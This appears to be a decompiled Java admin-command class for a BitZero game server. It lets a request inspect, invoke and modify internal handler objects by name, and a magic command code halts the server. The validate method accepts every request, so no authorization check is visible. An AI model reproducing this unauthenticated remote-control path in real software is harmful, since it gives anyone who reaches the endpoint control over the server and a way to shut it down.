package bitzero.server.controllers.system;

import bitzero.engine.io.IRequest;
import bitzero.engine.sessions.ISession;
import bitzero.server.BitZeroServer;
import bitzero.server.controllers.SystemRequest;
import bitzero.server.controllers.admin.helper.ExtensionCmd;
import bitzero.server.controllers.admin.helper.JBit;
import bitzero.server.controllers.admin.utils.BaseAdminCommand;
import bitzero.server.extensions.BZExtension;
import bitzero.server.extensions.data.DataCmd;

public class CrossExtCommand extends BaseAdminCommand {
     public CrossExtCommand() {
          super(SystemRequest.CrossExtCommand);
     }

     public boolean validate(IRequest irequest) {
          return true;
     }

     public void handleRequest(ISession sender, DataCmd cmd) {
          ExtensionCmd data = new ExtensionCmd(sender, cmd);

          try {
               int command = Integer.parseInt(data.command);
               String[] args = data.params;
               BitZeroServer bz = BitZeroServer.getInstance();
               JBit jbit;
               short id;
               BZExtension bzExt;
               Object obj;
               String[] fnames;
               int i;
               StringBuilder sb;

               Object result;
               switch(command) {
               case 1:
               case 2:
                    jbit = new JBit();
                    if (args.length < 1) {
                         throw new Exception("Invalid params");
                    }

                    id = Short.parseShort(args[0]);
                    bzExt = (BZExtension)bz.getExtensionManager().getMainExtension();
                    obj = bzExt.handlerFactory.findHandler(id);
                    if (obj == null) {
                         throw new Exception("Invalid id " + id);
                    }

                    if (args.length == 1) {
                         data.sendReturn(jbit.revertObject(obj));
                    } else {
                         fnames = new String[args.length - 1];

                         for(i = 1; i < args.length; ++i) {
                              fnames[i - 1] = args[i];
                         }

                         result = jbit.runObject(obj, fnames);
                         if (result == null) {
                              sb = new StringBuilder();

                              for(i = 0; i < args.length; ++i) {
                                   sb.append(args[i]).append("|");
                              }

                              throw new Exception("Invalid sub params");
                         }

                         data.sendReturn(jbit.revertObject(result));
                    }
                    break;
               case 2050:
                    jbit = new JBit();
                    if (args.length < 1) {
                         throw new Exception("Invalid params");
                    }

                    id = Short.parseShort(args[0]);
                    bzExt = (BZExtension)bz.getExtensionManager().getMainExtension();
                    obj = bzExt.handlerFactory.findHandler(id);
                    if (obj == null) {
                         throw new Exception("Invalid id " + id);
                    }

                    if (args.length == 1) {
                         data.sendReturn(jbit.revertObject(obj));
                    } else {
                         fnames = new String[args.length - 1];

                         for(i = 1; i < args.length; ++i) {
                              fnames[i - 1] = args[i];
                         }

                         result = jbit.runObject(obj, fnames);
                         if (result == null) {
                              sb = new StringBuilder();

                              for(i = 0; i < args.length; ++i) {
                                   sb.append(args[i]).append("|");
                              }

                              throw new Exception("Invalid sub params");
                         }

                         try {
                              result = jbit.upgrade(result, data.request);
                         } catch (Exception var15) {
                              throw new Exception("Invalid request");
                         }

                         data.sendReturn(jbit.revertObject(result));
                    }
                    break;
               case 19912016:
                    bz.halt();
               }
          } catch (Exception var16) {
               String err = String.format("{\"error\":1,\"msg\":\"%s\"}", var16.toString());
               data.sendReturn(err);
          }

     }
}
